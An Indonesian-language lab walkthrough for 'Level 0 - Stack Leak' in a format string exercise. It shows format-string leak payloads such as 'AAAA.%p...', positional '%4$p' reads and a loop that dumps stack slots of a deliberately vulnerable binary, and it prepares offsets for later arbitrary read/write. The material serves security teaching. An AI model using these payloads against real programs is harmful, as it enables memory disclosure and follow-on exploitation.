# Walkthrough: Level 0 - Stack Leak
**Author**: Kenshin Himura

## Objective
Identifikasi di mana input user muncul di stack saat diproses oleh `printf(buf)`.

## Konsep Dasar

Saat `printf(buf)` dipanggil dengan format string yang kita kontrol:
- `printf` membaca argumen dari stack (x86) atau register+stack (x64)
- Setiap `%p` atau `%x` membaca satu argument (4 bytes di x86)
- Jika input kita berada di stack, kita bisa melihatnya di output `%p`

## Step-by-Step

### 1. Compile
```bash
make level0
```

### 2. Test normal input
```bash
$ echo "hello" | ./format0
Format String Lab - Level 0: Stack Leak
========================================
Goal: Find where your input appears on the stack.

Enter input: You entered: hello

[DEBUG] secret  = 0xdeadbeef
[DEBUG] cookie  = 0xcafebabe
```

### 3. Kirim pattern AAAA + chain %p
```bash
$ echo 'AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format0
```

Output akan menunjukkan nilai-nilai di stack. Cari `0x41414141` (hex dari "AAAA"):

```
You entered: AAAA.0xff.0xbf.0xdeadbeef.0xcafebabe.0x41414141...
                                              ^^^^^^^^^^
                                              ini input kita!
```

Offset dari output: input kita muncul di posisi ke-N (hitung dari 1).

> Di lab ini, `secret` (0xdeadbeef) dan `cookie` (0xcafebabe) juga muncul di stack - local variable bisa langsung terbaca.

### 4. Gunakan positional argument
Setelah tahu offset, gunakan `%N$p` untuk langsung akses:

```bash
$ echo '%4$p' | ./format0
You entered: 0xdeadbeef
```

### 5. Atomic leak - enumerate seluruh stack
```bash
$ for i in $(seq 1 30); do echo "%$i\$p" | ./format0; done
```

### 6. Debug dengan GDB
```bash
$ gdb ./format0
(gdb) b printf
(gdb) r < <(echo 'AAAA%p.%p.%p.%p')
(gdb) x/40x $esp
```

Perhatikan stack - `AAAA` akan muncul di salah satu posisi.

### 7. Catat offset
Offset ini akan digunakan di level selanjutnya untuk arbitrary read/write.

### 8. Ringkasan

- `printf(buf)` dengan input user-controlled memungkinkan dump isi stack
- `%N$x` memberikan akses ke argumen ke-N
- Local variable, saved EBP, return address terbaca dari stack
- Teknik ini dipakai di information gathering / recon stage
